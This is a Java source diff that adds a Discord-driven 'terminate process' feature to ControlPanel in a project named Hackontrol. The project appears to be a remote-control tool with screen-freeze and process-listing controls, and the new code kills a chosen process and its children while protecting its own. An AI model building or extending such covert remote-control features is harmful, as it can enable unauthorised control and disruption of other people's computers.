@@ -5,6 +5,7 @@ import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
+import java.util.function.Consumer;
 
 import javax.sound.sampled.AudioInputStream;
 import javax.sound.sampled.AudioSystem;
@@ -24,8 +25,10 @@ import com.khopan.hackontrol.service.interaction.context.Question.QuestionType;
 import com.khopan.hackontrol.utils.HackontrolError;
 import com.khopan.hackontrol.utils.HackontrolMessage;
 import com.khopan.hackontrol.utils.LargeMessage;
+import com.khopan.hackontrol.utils.TimeSafeReplyHandler;
 import com.khopan.hackontrol.utils.interaction.HackontrolButton;
 import com.khopan.hackontrol.utils.sendable.ISendable;
+import com.khopan.hackontrol.utils.sendable.sender.ConsumerMessageCreateDataSendable;
 
 import net.dv8tion.jda.api.audio.AudioSendHandler;
 import net.dv8tion.jda.api.entities.Guild;
@@ -36,6 +39,7 @@ import net.dv8tion.jda.api.interactions.components.text.TextInput;
 import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
 import net.dv8tion.jda.api.interactions.modals.Modal;
 import net.dv8tion.jda.api.managers.AudioManager;
+import net.dv8tion.jda.api.utils.messages.MessageCreateData;
 
 public class ControlPanel extends Panel {
 	private static final String PANEL_NAME = "control";
@@ -61,6 +65,7 @@ public class ControlPanel extends Panel {
 	private static final Button BUTTON_PROCESS_REFRESH       = ButtonManager.staticButton(ButtonType.SUCCESS,   "Refresh",      "processRefresh");
 
 	private static final String MODAL_CHANGE_VOLUME          = "modalVolumeChange";
+	private static final String MODAL_TERMINATE_PROCESS      = "modalTerminateProcess";
 
 	private volatile float volume;
 	private volatile boolean volumeMute;
@@ -90,7 +95,26 @@ public class ControlPanel extends Panel {
 		this.register(Registration.BUTTON, ControlPanel.BUTTON_SCREEN_FREEZE,         context -> this.freeze(context, true));
 		this.register(Registration.BUTTON, ControlPanel.BUTTON_SCREEN_UNFREEZE,       context -> this.freeze(context, false));
 		this.register(Registration.BUTTON, ControlPanel.BUTTON_PROCESS_LIST,          this :: sendProcessList);
-		this.register(Registration.BUTTON, ControlPanel.BUTTON_PROCESS_TERMINATE,     context -> {});
+		this.register(Registration.BUTTON, ControlPanel.BUTTON_PROCESS_TERMINATE,     context -> {
+			ProcessEntry[] processList = Kernel.getProcessList();
+			int minimumIdentifier = Integer.MAX_VALUE;
+			int maximumIdentifier = Integer.MIN_VALUE;
+
+			for(int i = 0; i < processList.length; i++) {
+				minimumIdentifier = Math.min(minimumIdentifier, processList[i].processIdentifier);
+				maximumIdentifier = Math.max(maximumIdentifier, processList[i].processIdentifier);
+			}
+
+			TextInput textInput = TextInput.create("processIdentifier", "Process Identifier", TextInputStyle.SHORT)
+					.setRequired(true)
+					.setMinLength(Integer.toString(minimumIdentifier).length())
+					.setMaxLength(Integer.toString(maximumIdentifier).length())
+					.setPlaceholder(minimumIdentifier + " - " + maximumIdentifier)
+					.build();
+
+			context.replyModal(Modal.create(ControlPanel.MODAL_TERMINATE_PROCESS, "Terminate Process").addActionRow(textInput).build()).queue();
+		});
+
 		this.register(Registration.BUTTON, ControlPanel.BUTTON_PROCESS_REFRESH,       context -> {
 			this.sendProcessList(context);
 			HackontrolButton.deleteMessages(context);
@@ -121,6 +145,25 @@ public class ControlPanel extends Panel {
 			}
 
 			context.deferEdit().queue();
+		});
+
+		this.register(Registration.MODAL,  ControlPanel.MODAL_TERMINATE_PROCESS,      context -> {
+			String text = context.getValue("processIdentifier").getAsString();
+			int processIdentifier;
+
+			try {
+				processIdentifier = Integer.parseInt(text);
+			} catch(Throwable Errors) {
+				HackontrolError.message(context.reply(), "Invalid number format");
+				return;
+			}
+
+			if(processIdentifier == Kernel.getCurrentProcessIdentifier()) {
+				HackontrolMessage.boldDeletable(context.reply(), "Due to security reason, terminating the Hackontrol process is not allowed");
+				return;
+			}
+
+			TimeSafeReplyHandler.start(context, consumer -> this.terminateProcess(processIdentifier, consumer));
 		});
 	}
 
@@ -318,6 +361,28 @@ public class ControlPanel extends Panel {
 		}
 
 		LargeMessage.send(builder.toString(), callback, (request, identifiers) -> request.addActionRow(ControlPanel.BUTTON_PROCESS_REFRESH, ControlPanel.BUTTON_PROCESS_TERMINATE, HackontrolButton.delete(identifiers)));
+	}
+
+	private void terminateProcess(int processIdentifier, Consumer<MessageCreateData> consumer) {
+		ProcessEntry[] processList = Kernel.getProcessList();
+		List<Integer> killList = new ArrayList<>();
+		killList.add(processIdentifier);
+
+		for(int i = 0; i < processList.length; i++) {
+			ProcessEntry entry = processList[i];
+
+			if(entry.parentProcessIdentifier == processIdentifier) {
+				killList.add(entry.processIdentifier);
+			}
+		}
+
+		int size = killList.size();
+
+		for(int i = 0; i < size; i++) {
+			Kernel.terminateProcess(killList.get(i));
+		}
+
+		HackontrolMessage.boldDeletable(ConsumerMessageCreateDataSendable.of(consumer), "Successfully terminate " + size + " process" + (size == 1 ? "" : "es"));
 	}
 
 	private class SendHandler implements AudioSendHandler {
